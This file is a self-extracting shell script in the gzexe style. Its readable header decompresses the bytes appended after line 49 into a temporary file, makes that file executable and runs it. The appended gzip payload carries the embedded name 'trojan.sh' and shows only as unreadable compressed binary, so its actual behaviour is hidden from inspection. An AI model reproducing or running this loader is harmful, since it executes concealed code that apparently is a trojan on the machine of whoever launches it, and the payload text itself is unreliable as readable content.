#!/bin/sh
skip=49

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=/tmp/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
�a��btrojan.sh �RMO�0��W���u��8����m3�dJ\�@㷓u0�"��~~����^+�����*�A���9rF�*C��r��;C+�f�(/�ҡ�HBMMi��=O�}z^��a!<�'c2/L��Ь�L�0@�*���(G���\�c�;xzQԊ������ >jw�Q$;G��Y����׻���K�W-��l|l2~��w`�/8�Q^	���x��5JǦԉ���쇠�L�%�?��{xjl��!#M��;1�o yU��k��c�{���z�wF�¹��d.���w"g[�ac�E��N'����i�q�m��'�(��?�������u(K�h��$[�}�榤le*�ELL�7�،�Eb�^Q�t��S��I_*  